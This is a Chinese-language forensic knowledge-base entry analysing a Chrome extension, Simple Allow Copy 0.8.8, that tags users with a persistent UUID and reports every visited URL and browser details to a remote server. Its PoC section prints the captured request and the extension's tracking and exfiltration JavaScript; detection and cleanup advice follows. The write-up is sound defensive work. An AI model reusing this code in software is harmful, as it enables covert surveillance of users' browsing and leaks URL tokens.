---
id: defense-forensics-chrome-extension-url-telemetry-exfiltration
title: 恶意 Chrome 扩展遥测取证：Simple Allow Copy 0.8.8 用持久 UUID 关联 tabs 监听并上报全量 URL/浏览器指纹
type: scenario
domain: defense
path: defense/forensics
technique: chrome-extension-tabs-url-telemetry-exfiltration-analysis
tags:
- defense
- forensics
- chrome-extension
- privacy
- telemetry
- exfiltration
- browser-fingerprint
- uuid
- tabs-api
cve: []
severity: high
confidence: high
affected_versions: Simple Allow Copy 0.8.8（2024-07-08 更新）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V295
  verified_at: '2026-11-08T07:46:47+08:00'
  notes: 已对照原文content.md与全部8张图逐项核对：版本0.8.8/2024-07-08、70万用户、扩展ID aefehdhdciieocakfobpaaolhipkcpgc、api.simpleallowcopy.com/skip、POST JSON字段(timestamp/uri/user_agent/domain/locale/user_id/platform/referer)、storage.local sacp UUID、onActivated/onUpdated/action.onClicked触发、域名2024-05-29注册、IP 137.184.250.43均与图01-08一致。未验证点：未实际安装0.8.8复现上报行为；WHOIS仅据原文；dedup最高分为卡自身exact(自匹配)，无同链候选。frontmatter无sources/source_url（符合规范）。
url: /docs/defense/forensics/defense-forensics-chrome-extension-url-telemetry-exfiltration/
draft: false
kb_aliases:
- Simple Allow Copy
- api.simpleallowcopy.com
- aefehdhdciieocakfobpaaolhipkcpgc
- sacp UUID
- chrome.tabs.onActivated
- /skip 遥测
- 浏览器插件监视
---

## 一句话结论

Simple Allow Copy 0.8.8 的 `background/index.js` 先在 `chrome.storage.local` 中生成并持久化一个 UUID（键 `sacp`），然后监听 `chrome.tabs.onActivated`、`chrome.tabs.onUpdated` 与 `action.onClicked`；每次标签页切换/URL 变化时，它把 `timestamp`、`uri`、`user_agent`、`domain`、`locale`、`user_id`、`platform`、`referer` 组成 JSON POST 到 `https://api.simpleallowcopy.com/skip`，服务端还能记录请求来源 IP，从而把 70 万用户的浏览历史按同一 UUID 长期关联。

## 原理

- **权限模型**：Chrome 扩展的 `tabs` 权限允许读取标签页的 URL/title；MV3 的 background service worker 常驻/按需唤醒；`chrome.storage.local` 在浏览器重启、清 Cookie 后仍保留；`self.crypto.randomUUID()` 生成稳定标识。四者组合就是“持久用户 ID + 全量 URL 采集 + 远端上报”的完整能力。
- **UUID 持久化**：`chrome.storage.local.get(["sacp"])` 若不存在就 `crypto.randomUUID()` 并 `set({sacp: e})`；此后每条上报都带同一个 `user_id`。即使清除 Cookie/换会话，`sacp` 仍在扩展存储里，能把一年甚至更久的浏览记录串成同一用户的画像。
- **事件触发**：`chrome.tabs.onActivated`（切换标签）、`chrome.tabs.onUpdated`（URL 变化）、`chrome.action.onClicked`（点击扩展图标）都会调用 `i()`；`i()` 里用 `o[i.id] !== i.url || n !== i.id` 去重，避免同一标签同一 URL 重复上报，随后 `setTimeout` 异步处理并 `fetch`。
- **上报字段**：`timestamp`（本地时间）、`uri`（完整 URL，可能含 GET 参数/Token）、`user_agent`、`domain`（`new URL(uri).hostname`）、`locale`、`user_id`（`sacp` UUID）、`platform`、`referer`（`initiator`）。这些字段足以做指纹识别、访问轨迹还原、内部系统/身份推断；请求来源 IP 又由服务端天然记录，形成“UUID + IP + 全量 URL”的关联。
- **危害放大**：GET 明文传输的密码/Token/内部地址会随 `uri`/`referer` 一起泄露；长期使用后，公司网站、搜索记录、家庭住址查询、安全设备地址等可用于定位真实身份、工作单位与住址；红蓝队场景下，攻击目标/漏洞/Payload 也可能被插件作者看到。
- **伪装与时间线**：商店页隐私声明写“不会收集或使用您的数据”，但 0.8.8 于 2024-07-08 更新，上报域名 `api.simpleallowcopy.com` 于 2024-05-29 注册；域名先注册、插件后更新，说明是有计划的遥测行为。文章观察时该插件已有 70 万用户。
- **证据链**：代理/Burp 中的 `POST /skip`（Origin 为 `chrome-extension://aefehdhdciieocakfobpaaolhipkcpgc`）、`background/index.js` 源码、`chrome.storage.local` 的 `sacp`、商店版本/更新时间与域名 WHOIS，构成完整取证链。

## 触发条件

- 用户安装/自动更新到 Simple Allow Copy 0.8.8（浏览器默认自动更新扩展）。
- 扩展拥有 `tabs` 权限，background 脚本在运行；用户切换标签或访问新 URL。
- 浏览器可访问 `api.simpleallowcopy.com`（无网络隔离/出站拦截）。
- 分析者能在代理/Burp 中观察 HTTPS 流量（安装 CA 证书）或能读取扩展目录/源码。

## 利用步骤

1. **流量发现**：挂代理观察浏览器的固定周期/事件型 POST；文章看到大量 `POST https://api.simpleallowcopy.com/skip`（200、JSON、固定 IP 137.184.250.43），请求头 `Origin: chrome-extension://aefehdhdciieocakfobpaaolhipkcpgc`。
2. **定位扩展**：`chrome://extensions` 开启开发者模式，记下扩展 ID；在用户数据目录的 `Extensions/<id>/<version>/` 找到 `manifest.json` 与 `background/index.js`。
3. **读权限与代码**：检查 `permissions`（`tabs`、`storage` 等）；搜索 `chrome.tabs.onActivated`、`chrome.tabs.onUpdated`、`chrome.action.onClicked`、`chrome.storage.local`、`crypto.randomUUID`、`fetch(`、`api.`。
4. **还原数据流**：确认 `sacp` 的生成/读取、`cmta` 对象的字段、`fetch` 的 URL/方法/headers/body；记录去重条件与触发事件。
5. **评估影响**：把 `uri`/`referer` 与用户访问的敏感站点、GET Token、内部域名关联；检查商店隐私声明与实际行为是否矛盾；用 WHOIS 查上报域名注册时间与插件更新时间。
6. **取证与处置**：保存扩展文件哈希、manifest、background 源码、HAR/pcap、截图；卸载/禁用扩展；企业侧把扩展 ID/域名加入黑名单并审计其他机器；若 GET 中曾出现凭据，轮换。
7. **验证其他版本**：检查低版本是否已含遥测；即使当前版本干净，浏览器自动更新也可能再次引入，需锁定版本/关闭自动更新或使用企业白名单。

## PoC

文章观察到的请求：

```http
POST /skip HTTP/1.1
Host: api.simpleallowcopy.com
User-Agent: xixi
Content-Type: application/json
Accept: */*
Origin: chrome-extension://aefehdhdciieocakfobpaaolhipkcpgc
Sec-Fetch-Site: none
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"timestamp":"","uri":"","user_agent":"","domain":"","locale":"","user_id":"","platform":"","referer":""}
```

```javascript
// background/index.js 关键逻辑（文章节选）
chrome.storage.local.get(["sacp"], function (e) {
    if (void 0 === e.sacp) {
        let e = self.crypto.randomUUID();
        chrome.storage.local.set({ sacp: e });
    }
});

const i = () => {
    chrome.tabs.query({ active: !0, currentWindow: !0 }, ([i]) => {
        if (i && i.url) {
            if (i.url !== "" && (o[i.id] !== i.url || n !== i.id)) {
                n = i.id; o[i.id] = i.url;
                setTimeout(() => {
                    let n = new URL(i.url);
                    chrome.storage.local.get(["sacp"], function (i) {
                        let c = i.sacp;
                        const cmta = {
                            timestamp: Date().toLocaleString(),
                            uri: i.url,
                            user_agent: navigator.userAgent,
                            domain: n.hostname,
                            locale: navigator.language,
                            user_id: c || "",
                            platform: navigator.platform || "",
                            referer: i.initiator || ""
                        };
                        fetch("https://api.simpleallowcopy.com/skip", {
                            headers: { "Content-Type": "application/json" },
                            method: "POST",
                            body: JSON.stringify(cmta)
                        }).then(r => r.json()).then(o => { /* icon/skip 处理 */ });
                    });
                }, 0);
            }
        }
    });
};

chrome.action.onClicked.addListener(() => { /* ... */ });
chrome.tabs.onActivated.addListener(() => { i(); });
chrome.tabs.onUpdated.addListener(() => { i(); });
chrome.tabs.onRemoved.addListener(e => { delete o[e]; });
```

```bash
# 快速审计本机扩展（Chrome/Edge 用户数据目录）
grep -R "chrome.tabs.onActivated\|chrome.tabs.onUpdated\|chrome.storage.local\|crypto.randomUUID" \
  "$LOCALAPPDATA/Google/Chrome/User Data/Default/Extensions" 2>/dev/null
```

## 变体与关联

- **权限变体**：其他扩展可能申请 `webRequest`/`cookies`/`history`/`bookmarks`/`management`，采集范围更大；MV3 用 service worker + `declarativeNetRequest` 也能观察/改写请求。
- **外传变体**：`fetch` POST、图片像素、WebSocket、DNS 查询、`sendBeacon`；数据可加密/编码后再外传，代理里只看到随机路径/二进制。
- **供应链变体**：扩展先发布干净版本积累用户，再通过自动更新引入遥测；或被收购/账号被盗后更新；企业应锁定版本/允许列表。
- **关联**：[[defense-forensics-chromium-artifact-offline-decrypt]]（Chromium 本地数据取证）、[[defense-forensics-redline-stealer-collection-geofence]]（浏览器凭据/数据窃取面）、[[web-generic-third-party-js-domain-takeover-night-redirect]]（第三方脚本/域名被接管导致的浏览器侧数据外泄）。
- **边界**：扩展未申请 `tabs`/未联网、仅声明最小权限时，无法读取 URL；若上报走加密/域名前置，需结合扩展源码与内存取证；企业代理若不解密 HTTPS，只能看到 SNI/域名与流量特征。

## 检测与防御

- **检测**：代理/DNS 日志中出现 `chrome-extension://` 作为 Origin 的 POST、固定未知域名的高频上报、`/skip` 类遥测路径；扩展目录中出现 `crypto.randomUUID`+`chrome.tabs.onActivated`+`fetch` 组合；商店隐私声明与实际网络行为矛盾。
- **企业加固**：扩展允许列表/强制安装策略，禁止用户自行安装未知扩展；锁定版本、关闭自动更新或通过策略控制；网络侧拦截未知上报域名；EDR/浏览器管理平台审计扩展权限与网络行为。
- **个人处置**：卸载/禁用 Simple Allow Copy 0.8.8 及类似插件；检查 `chrome.storage.local` 中是否已有 `sacp`；若曾用它访问敏感系统/带 Token 的 URL，轮换凭据；文章建议可通过屏蔽 `https://clients2.google.com/service/update2/crx` 禁止扩展自动更新（注意这也会影响 Chrome 组件更新，需评估）。
- **检测规则思路**：对 `Origin: chrome-extension://<id>` 的出站请求做基线；对扩展 ID 与商店版本的变更告警；对 `POST` JSON 含 `user_id`/`uri`/`user_agent`/`referer` 组合的请求重点审查。
